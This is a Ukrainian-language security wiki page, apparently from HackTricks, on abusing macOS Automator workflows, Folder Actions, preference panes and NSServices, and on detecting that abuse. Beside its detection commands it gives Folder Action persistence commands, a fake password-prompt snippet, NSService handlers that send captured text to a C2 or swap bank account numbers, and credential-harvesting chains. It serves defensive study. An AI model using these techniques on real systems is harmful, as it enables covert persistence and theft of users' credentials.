# Зловживання macOS Automator, Preference Panes та NSServices

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions та Workflows

### Основна інформація

**Automator** — це візуальний інструмент macOS для автоматизації. Він виконує **workflows** (пакети `.workflow`), що складаються з **actions** (пакетів `.action`). Automator також забезпечує роботу **Folder Actions**, **Quick Actions** та інтеграцію з **Shortcuts**. У сучасних версіях macOS workflows також можна **імпортувати в Shortcuts**, тому та сама шкідлива логіка може відображатися як Finder Quick Action, user service у `~/Library/Services/` або shortcut на основі застарілих Automator actions.

Automator actions — це **plugins**, які завантажуються середовищем виконання Automator під час виконання workflow. Вони можуть:
- Виконувати довільні shell scripts
- Обробляти файли та дані
- Взаємодіяти із застосунками через AppleScript
- Об'єднуватися в ланцюжки для складної автоматизації

### Чому це важливо

> [!WARNING]
> Automator workflows можна **соціально спроєктувати для виконання** — вони виглядають як звичайні файли документів. Пакет `.workflow` може містити вбудовані shell commands, які виконуються під час запуску workflow. У поєднанні з Folder Actions вони забезпечують **автоматичну persistence**, що активується під час подій із файлами. Нещодавні виправлення Gatekeeper також показали, що **Quick Actions, вбудовані в застосунки** (`Contents/PlugIns/*.workflow`), слід розглядати як виконуваний вміст, а не як нешкідливі дані.

### Виявлення
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Атака: Workflow із соціальною інженерією

Для більшості користувачів bundle `.workflow` виглядає як звичайний файл документа:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Атака: Folder Action Persistence

Folder Actions автоматично виконують workflow, коли файли додаються до папки, що відстежується:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions зберігаються після перезавантаження та виконуються безшумно. Folder Action для `~/Downloads` означає, що **кожен завантажений файл запускає ваш payload** — зокрема файли із Safari, Chrome, AirDrop і вкладення електронних листів. Також зверніть увагу, що `System Events` може реєструвати Folder Actions, які вказують на скрипти за межами стандартних розташувань `~/Library/Scripts/Folder Action Scripts`, тому пошук за довільними шляхами також може бути корисним. Щодо пов’язаних наслідків для TCC див. [сторінку TCC](../macos-security-protections/macos-tcc/README.md).

---

## Панелі налаштувань

### Основна інформація

Панелі налаштувань (`.prefPane` bundles) — це plugins, які завантажуються з **System Settings** (раніше System Preferences). Вони надають панелі інтерфейсу для налаштування системних або сторонніх функцій. У старіших системах вони завантажувалися безпосередньо через `System Preferences`; у новіших релізах сторонні панелі зазвичай обслуговуються **legacy loader XPC service**, запущеним із System Settings.

### Чому це важливо

- Панелі налаштувань виконуються у **trusted host process**, запущеному System Settings / System Preferences
- У сучасних системах цим host може бути **`legacyLoader` XPC service**, тому важливою межею все одно залишається **trusted Apple UI process -> завантаження стороннього коду**
- Сторонні панелі налаштувань успадковують **контекст безпеки host process** і довіру користувача, пов’язану з цим інтерфейсом
- Користувачі встановлюють панелі налаштувань, **двічі клацаючи** їх — це зручно для social engineering
- Після встановлення вони **зберігаються** та завантажуються щоразу, коли System Settings відкриває цю панель

### Виявлення
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

Шкідлива панель налаштувань успадковує **контекст безпеки host-процесу панелі** (історично `System Preferences`, а в новіших версіях часто допоміжний процес `legacyLoader`, запущений через `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Атака: Persistence via Installation
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attack: UI Phishing

Панель налаштувань може імітувати легітимні системні панелі інтерфейсу, щоб **виманювати облікові дані**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Основна інформація

**NSServices** дають змогу застосункам надавати функціональність іншим застосункам через меню **Services** (правий клік → Services). Коли користувач вибирає текст або дані та викликає service, вибрані дані **надсилаються постачальнику service** для обробки.

Services оголошуються у `Info.plist` застосунку під ключем `NSServices` і реєструються на pasteboard server (`pbs`). macOS також зберігає **кеш service** і **політику обмежень**, які визначають, які services видимі та чи повинні sandboxed callers отримувати додаткове попередження.

### Чому це важливо

- Services отримують **міжзастосунковий потік даних** — вибраний текст із будь-якого застосунку надсилається service
- Шкідливий service може захоплювати дані з password managers, email-клієнтів і фінансових застосунків
- Services можуть **повертати змінені дані** застосунку, що їх викликав (man-in-the-middle для операцій із вибраними даними)
- Назви services можна сформувати так, щоб вони виглядали легітимно ("Format Text", "Encrypt Selection", "Share")
- Необов'язковий прапорець `NSRestricted` має значення для безпеки: service, позначений як unrestricted, може викликатися sandboxed app без попередження, яке macOS показує для services, здатних спричинити escape<sup>[[2]](#references)</sup>

### Виявлення
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Атака: Сервіс перехоплення даних
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Атака: модифікація даних (Man-in-the-Middle)

Сервіс може **модифікувати повернуті дані**, водночас виглядаючи так, ніби він надає легітимну функцію:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services і сучасне зловживання

Apple підтримує необов'язковий булевий параметр `NSRestricted` для кожного визначення service. Якщо його встановлено, macOS попереджає sandboxed callers, оскільки service може допомогти їм **вийти за межі sandbox або privacy boundaries**. З offensive perspective це дає два корисні напрямки аудиту:

- Шукати **third-party services, не позначені як restricted**, хоча вони проксують Apple Events, доступ до файлів або інші privileged actions
- Шукати **цінні built-in services** із сильними entitlements (наприклад, services, які надаються Script Editor або helpers на базі Finder), і перевіряти, чи достатньо user interaction, щоб перетворити їх на primitive для доступу до даних

Хорошим нещодавнім прикладом є **CVE-2022-48574**, де механізм Services можна було використати для доступу до **TCC-protected user files без очікуваного confirmation flow**. Вразливість виправлено, але техніка залишається корисною для threat modeling: будь-який service, який пересилає запити на доступ до файлів або automation від імені caller, заслуговує на таку саму увагу.<sup>[[2]](#references)</sup>

---

## Останні нотатки щодо безпеки

- **Quick Actions є executable content**: у 2024 році Apple виправила Gatekeeper bypass, за якого Automator Quick Action, вбудований у app bundle, міг запускатися без звичайної перевірки. Під час аудиту apps перевіряйте `Contents/PlugIns/*.workflow/Contents/document.wflow` так само, як helper scripts або login items. Див. [сторінку Gatekeeper](../macos-security-protections/macos-gatekeeper.md).<sup>[[1]](#references)</sup>
- **Shortcuts можуть успадковувати legacy Automator behavior**: Apple також додала додатковий user-consent prompt після того, як було виявлено, що third-party shortcuts використовували **legacy Automator action** для надсилання Apple Events без очікуваного permission flow. Imported workflows і shortcut bundles слід перевіряти на наявність `Run AppleScript`, `Run Shell Script` та подібних bridge actions. Див. [сторінку TCC](../macos-security-protections/macos-tcc/README.md).<sup>[[3]](#references)</sup>
- **Automator і досі є актуальною privacy boundary**: у 2025 році Apple випустила ще одне виправлення Automator для доступу до protected user data. Навіть якщо Automator є legacy surface, розглядайте будь-який workflow runner, Quick Action host або automation bridge як поточну attack surface, а не dead code.<sup>[[4]](#references)</sup>

---

## Ланцюжки атак між техніками

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Панель налаштувань → Ескалація TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Крадіжка даних із менеджера паролів
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Посилання

- [1] [Apple — Про вміст безпеки macOS Ventura 13.7, Sonoma 14.7 та Sequoia 15](https://support.apple.com/en-us/121238)
- [2] [Moonlock — Як працював exploit NSServices у macOS](https://moonlock.com/nsservices-macos)
- [3] [Apple — Про вміст безпеки macOS Sonoma 14.6 (CVE-2024-40834)](https://support.apple.com/en-us/120911)
- [4] [Apple — Про вміст безпеки macOS Sequoia 15.4 (CVE-2025-30460)](https://support.apple.com/en-us/122373)

{{#include ../../../banners/hacktricks-training.md}}
